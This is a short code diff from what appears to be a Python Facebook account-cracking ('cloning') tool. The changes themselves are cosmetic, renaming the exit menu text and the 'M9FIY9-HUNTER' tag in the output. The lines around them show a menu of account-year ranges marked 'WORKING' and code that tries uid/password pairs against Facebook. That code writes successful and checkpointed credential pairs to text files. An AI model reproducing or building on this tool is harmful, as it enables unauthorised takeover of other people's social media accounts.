@@ -519,7 +519,7 @@ class Main:
 		print(" \033[1;32m[3] 𝐈𝐍𝐃 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 (𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐎𝐎𝐍)")
 		print(" \033[1;32m[4] 2006-2012 (𝐖𝐎𝐑𝐊𝐈𝐍𝐆)")
 		print(" \033[1;32m[5] 2004-2008 (𝐖𝐎𝐑𝐊𝐈𝐍𝐆)")
-	    print(" \033[ 1;32m[E] EXIT(𝐓𝐇𝐀𝐍𝐊𝐘𝐎𝐔❤️)")
+		print("\033[1;32m [E] 𝐄𝐗𝐈𝐓 (𝐓𝐇𝐀𝐍𝐊𝐒❤️) \n")
 		mafiya =input(" \033[1;32mCHOOSE : ")
 		if mafiya in ["1", "01"]:
 			File()
@@ -1392,7 +1392,7 @@ class Main:
 				open("M9FIY9-HUNTER-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[MAFIYA-XD-TOM] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[M9FIY9-HUNTER] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
